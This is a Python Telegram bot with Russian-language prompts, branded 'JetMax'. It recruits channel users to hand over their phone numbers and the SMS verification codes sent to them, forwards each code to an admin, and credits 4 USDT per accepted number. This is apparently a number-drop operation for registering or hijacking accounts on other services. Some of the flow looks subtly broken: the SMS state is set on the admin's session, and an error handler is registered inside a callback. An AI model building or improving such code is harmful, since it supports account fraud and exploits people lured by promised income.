import asyncio
import asyncpg
import os
import time
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHANNEL_URL = os.getenv("CHANNEL_URL")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
DATABASE_URL = os.getenv("DATABASE_URL")

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

class Form(StatesGroup):
    waiting_number = State()
    waiting_sms = State()

db_pool = None

async def init_db():
    global db_pool
    db_pool = await asyncpg.create_pool(DATABASE_URL)
    async with db_pool.acquire() as conn:
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                username TEXT,
                current_number TEXT,
                number_timestamp BIGINT,
                balance DECIMAL(10,2) DEFAULT 0.00
            )
        ''')
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS requests (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                username TEXT,
                number TEXT,
                status TEXT,
                created_at BIGINT
            )
        ''')
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS approved_requests (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                username TEXT,
                number TEXT,
                request_number INTEGER,
                created_at BIGINT
            )
        ''')

def get_main_keyboard():
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="💰 Баланс")]],
        resize_keyboard=True
    )
    return keyboard

def get_channel_id_from_url():
    url = CHANNEL_URL
    if url.startswith("https://t.me/"):
        username = url.replace("https://t.me/", "")
        return username
    elif url.startswith("@"):
        return url[1:]
    return url

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.full_name
    async with db_pool.acquire() as conn:
        await conn.execute('''
            INSERT INTO users (user_id, username) VALUES ($1, $2)
            ON CONFLICT (user_id) DO UPDATE SET username = $2
        ''', user_id, username)
    
    await message.answer(
        f"🔐 <b>JetMax - твое богатое будущее!</b>\nДля дальнейшей работы с ботом подпишитесь на канал: {CHANNEL_URL}",
        reply_markup=get_main_keyboard(),
        parse_mode="HTML"
    )

@dp.message(F.text == "💰 Баланс")
async def show_balance(message: types.Message):
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT balance FROM users WHERE user_id = $1", message.from_user.id)
        balance = row["balance"] if row else 0.00
    await message.answer(
        f"<b>💳 Ваш текущий баланс:</b>\n<code>{balance:.2f} USDT</code>",
        parse_mode="HTML"
    )

@dp.message(Command("menu"))
async def cmd_menu(message: types.Message):
    await message.answer("Меню:", reply_markup=get_main_keyboard())

@dp.message(Command("create"))
async def cmd_create(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    channel_username = get_channel_id_from_url()
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Сдать номер", callback_data="send_number")]
    ])
    await bot.send_message(
        f"@{channel_username}",
        "<b>💼 Требуется номер для работы!</b>\n<i>⏱️ Нажмите кнопку снизу для сдачи</i>",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "send_number")
async def call_send_number(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    username = callback.from_user.username or callback.from_user.full_name
    async with db_pool.acquire() as conn:
        user = await conn.fetchrow("SELECT current_number, number_timestamp FROM users WHERE user_id = $1", user_id)
        if user and user["current_number"]:
            last_time = user["number_timestamp"]
            if last_time:
                elapsed = int(time.time()) - last_time
                if elapsed < 600:
                    remaining = 600 - elapsed
                    minutes = remaining // 60
                    seconds = remaining % 60
                    await callback.message.answer(f"⏳ Этот номер недавно обрабатывался.\nЕго можно поставить повторно только через {minutes:02d}:{seconds:02d}")
                    await callback.answer()
                    return
    await state.set_state(Form.waiting_number)
    await state.update_data(user_id=user_id, username=username)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отменить", callback_data="cancel_request")]
    ])
    await callback.message.answer(
        "<b>⏱️ Заявка принята!</b>\nОтправьте ниже свой номер в любом формате.\nТаймер на выполнение: 1 мин",
        reply_markup=keyboard,
        parse_mode="HTML"
    )
    await callback.answer()
    asyncio.create_task(timeout_number(user_id, state))

async def timeout_number(user_id: int, state: FSMContext):
    await asyncio.sleep(60)
    current_state = await state.get_state()
    if current_state == Form.waiting_number.state:
        data = await state.get_data()
        if data.get("user_id") == user_id:
            await state.clear()
            await bot.send_message(user_id, "⏰ Время вышло. Заявка отменена.")

@dp.callback_query(F.data == "cancel_request")
async def cancel_request(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    username = callback.from_user.username or callback.from_user.full_name
    current_state = await state.get_state()
    if current_state:
        await state.clear()
    async with db_pool.acquire() as conn:
        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
    await callback.message.answer("❌ Заявка отменена")
    await bot.send_message(
        ADMIN_ID,
        f"<b>🔐 Заявка отменена!</b>\nПользователь: @{username} [{user_id}]\nНомер заявки: #отменено",
        parse_mode="HTML"
    )
    await callback.answer()

@dp.message(Form.waiting_number)
async def process_number(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    number = message.text.strip()
    data = await state.get_data()
    username = data.get("username", message.from_user.username or message.from_user.full_name)
    async with db_pool.acquire() as conn:
        await conn.execute('''
            UPDATE users SET current_number = $1, number_timestamp = $2 WHERE user_id = $3
        ''', number, int(time.time()), user_id)
        await conn.execute('''
            INSERT INTO requests (user_id, username, number, status, created_at) 
            VALUES ($1, $2, $3, 'waiting_sms', $4)
        ''', user_id, username, number, int(time.time()))
    await state.clear()
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Запросить смс", callback_data=f"request_sms_{user_id}"),
         InlineKeyboardButton(text="Отклонить заявку", callback_data=f"reject_{user_id}")]
    ])
    await bot.send_message(
        ADMIN_ID,
        f"<b>💼 Новая заявка от @{username} (ID: {user_id})</b>\nНомер: <code>{number}</code>",
        reply_markup=keyboard,
        parse_mode="HTML"
    )
    await message.answer("✅ Номер принят, ожидайте решения администратора")

@dp.callback_query(F.data.startswith("request_sms_"))
async def request_sms(callback: types.CallbackQuery, state: FSMContext):
    user_id = int(callback.data.split("_")[2])
    async with db_pool.acquire() as conn:
        await conn.execute("UPDATE requests SET status = 'waiting_sms' WHERE user_id = $1", user_id)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отменить", callback_data="cancel_sms")]
    ])
    await bot.send_message(
        user_id,
        "<b>⏱️ Введите код из смс!</b>\nТаймер на выполнение: 1 мин",
        reply_markup=keyboard,
        parse_mode="HTML"
    )
    await state.set_state(Form.waiting_sms)
    await state.update_data(user_id=user_id)
    asyncio.create_task(timeout_sms(user_id, state))
    await callback.answer("Запрос отправлен")

async def timeout_sms(user_id: int, state: FSMContext):
    await asyncio.sleep(60)
    current_state = await state.get_state()
    if current_state == Form.waiting_sms.state:
        data = await state.get_data()
        if data.get("user_id") == user_id:
            await state.clear()
            await bot.send_message(user_id, "⏰ Время вышло. Заявка отменена.")

@dp.callback_query(F.data.startswith("reject_"))
async def reject_request(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])
    async with db_pool.acquire() as conn:
        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
    await bot.send_message(
        user_id,
        "<b>🔐 Заявка отклонена!</b>\nПричина: отклонена администрацией",
        parse_mode="HTML"
    )
    await callback.answer("Заявка отклонена")
    await callback.message.delete_reply_markup()

@dp.message(Form.waiting_sms)
async def process_sms(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    sms_code = message.text.strip()
    data = await state.get_data()
    if data.get("user_id") != user_id:
        return
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT number FROM requests WHERE user_id = $1", user_id)
        if not row:
            await message.answer("Заявка не найдена")
            await state.clear()
            return
        number = row["number"]
    username = message.from_user.username or message.from_user.full_name
    await state.clear()
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Номер встал", callback_data=f"accept_{user_id}_{sms_code}"),
         InlineKeyboardButton(text="Номер Зарегистрирован", callback_data=f"registered_{user_id}"),
         InlineKeyboardButton(text="Получена ошибка", callback_data=f"error_{user_id}")]
    ])
    await bot.send_message(
        ADMIN_ID,
        f"<b>👨‍💻 Получен код!</b>\nПользователь: @{username} [{user_id}]\nКод: <code>{sms_code}</code>",
        reply_markup=keyboard,
        parse_mode="HTML"
    )
    await message.answer("✅ Код отправлен администратору")

@dp.callback_query(F.data.startswith("accept_"))
async def number_accepted(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    user_id = int(parts[1])
    sms_code = parts[2]
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT number FROM requests WHERE user_id = $1", user_id)
        if not row:
            await callback.answer("Заявка не найдена")
            return
        number = row["number"]
        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
        count = await conn.fetchval("SELECT COUNT(*) FROM approved_requests")
        request_number = 12 + count
        username = callback.from_user.username or callback.from_user.full_name
        await conn.execute('''
            INSERT INTO approved_requests (user_id, username, number, request_number, created_at)
            VALUES ($1, $2, $3, $4, $5)
        ''', user_id, username, number, request_number, int(time.time()))
        await conn.execute("UPDATE users SET balance = balance + 4.00 WHERE user_id = $1", user_id)
    await bot.send_message(
        user_id,
        f"<b>🎉 Номер принят!</b>\nВам успешно 4.0$ на баланс.\n\nНомер заявки: #{request_number}",
        parse_mode="HTML"
    )
    await callback.answer("Номер принят")
    await callback.message.delete_reply_markup()

@dp.callback_query(F.data.startswith("registered_"))
async def number_registered(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])
    async with db_pool.acquire() as conn:
        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
    await bot.send_message(
        user_id,
        "<b>🔐 Номер уже зарегистрирован!</b>\nОжидайте создания следующей заявки в канале.",
        parse_mode="HTML"
    )
    await callback.answer("Номер зарегистрирован")
    await callback.message.delete_reply_markup()

@dp.callback_query(F.data.startswith("error_"))
async def got_error(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])
    await callback.message.answer("Введите причину ошибки:")
    await callback.answer()
    
    @dp.message
    async def get_error_reason(message: types.Message):
        if message.from_user.id != ADMIN_ID:
            return
        reason = message.text
        async with db_pool.acquire() as conn:
            await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
        await bot.send_message(
            user_id,
            f"<b>🔐 {reason}</b>",
            parse_mode="HTML"
        )
        await message.answer("Причина отправлена")
        dp.message.handlers.remove(get_error_reason)

@dp.callback_query(F.data == "cancel_sms")
async def cancel_sms(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    await state.clear()
    async with db_pool.acquire() as conn:
        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
    await callback.message.answer("❌ Заявка отменена")
    await callback.answer()

async def main():
    await init_db()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
